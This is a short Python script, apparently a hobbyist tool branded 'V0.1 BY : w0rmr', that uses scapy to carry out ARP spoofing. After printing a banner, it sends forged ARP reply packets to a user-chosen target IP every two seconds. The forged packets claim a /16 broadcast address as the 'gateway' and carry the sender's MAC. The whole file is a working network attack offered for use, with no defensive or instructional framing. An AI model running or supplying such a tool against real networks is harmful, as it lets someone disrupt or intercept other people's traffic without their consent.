from scapy.all import ARP, send, get_if_hwaddr, get_if_addr, conf
import time

def print_ascii_art():
    art = """\033[31m
   _____  ________   ________   ________   ________     _________
  /  |  | \_____  \  \______ \  \______ \  \_____  \   /   _____/
 /   |  |_ /  ____/   |    |  \  |    |  \  /   |   \  \_____  \ 
/    ^   //       \   |    `   \ |    `   \/    |    \ /        \\
\____   | \_______ \ /_______  //_______  /\_______  //_______  /
     |__|         \/         \/         \/         \/         \/ V0.1   \033[32mBY : w0rmr  
    \033[0m"""
    print(art)
def main():
    print_ascii_art()
    local_ip = get_if_addr(conf.iface)
    ip_parts = local_ip.split(".")
    ga_ip = f"{ip_parts[0]}.{ip_parts[1]}.255.255"

    arp_packet = ARP()
    arp_packet.psrc = ga_ip
    arp_packet.hwsrc = get_if_hwaddr(conf.iface) 
    
    print("GateAway IP:", arp_packet.psrc)
    print("Source MAC address:", arp_packet.hwsrc)

    target_ip = input("Enter target IP: ")
    arp_packet.pdst = target_ip  
    arp_packet.op = 2 

    try:
        while True:
            send(arp_packet, verbose=False)
            print(f"Sent spoofed ARP packet to {target_ip}")
            time.sleep(2)  
    except KeyboardInterrupt:
        print("\nARP spoofing stopped.")

if __name__ == "__main__":
    main()
